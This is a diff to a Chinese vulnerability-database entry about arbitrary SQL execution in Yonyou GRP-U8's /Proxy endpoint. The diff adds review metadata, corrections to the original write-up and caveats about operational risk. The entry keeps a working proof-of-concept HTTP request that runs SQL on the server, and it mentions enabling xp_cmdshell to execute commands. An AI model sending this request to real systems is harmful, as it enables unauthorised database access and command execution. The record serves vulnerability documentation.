@@ -1,10 +1,51 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "用友GRP-U8 Proxy DataSetProviderData任意SQL执行"
+product: "用友GRP-U8"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: "CNNVD-201610-923"
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "新政府会计制度专版，cVer9.8.0只是协议字段"
+prerequisites: "无Cookie示例；DB高级权限才可命令"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+identifier_role: "primary"
+source_url: "https://mp.weixin.qq.com/s/3Tevu8dc_Cin6MTEUZvxFg"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8B%20GRP-U8%20%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E8%B4%A2%E5%8A%A1%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SQL%20%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.md"
+id: "vw-2b39d5af3c7dfc1b536f3565"
+entity_id: "ve-2b39d5af3c7dfc1b536f3565"
+schema_version: "1"
 ---
 
-# 用友 GRP-U8 行政事业财务管理软件 SQL 注入 CNNVD-201610-923
+# 用友GRP-U8 Proxy DataSetProviderData任意SQL执行
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：用友GRP-U8；Proxy DataSetProviderData任意SQL执行
+- 版本、配置及部署条件：新政府会计制度专版，cVer9.8.0只是协议字段
+- 认证与权限前提：无Cookie示例；DB高级权限才可命令
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 误称XXE：所给XML无DOCTYPE/外部实体，实际直接DATA提交SQL，不能据XML封装推XXE
+- 开启xp_cmdshell/advanced options是安全配置变更，缺回滚；忽略所有SQL异常不可靠
+- HTTP三header压同一行；脚本第4条配置后即POC2，早于最终reconfigure可能递归重复
+- CNNVD归属/真实build缺官方确认，查询失败不能宣称已修复
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3Tevu8dc_Cin6MTEUZvxFg)
 
 ![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)
@@ -21,17 +62,18 @@ source: "MrWQ/vulnerability-paper"
 
 **漏洞利用 POC 请求包**
 
-```
+```http
 POST /Proxy HTTP/1.1
 Accept: Accept: */*
 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host
-Content-Length: 357
 Connection: Keep-Alive
 Cache-Control: no-cache
 
 
 cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
 ```
+
+> 请求长度说明：原资料 Content-Length 为 357；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 请求后按 F12 查看源代码可以得到 SQL 语句查询结果
 
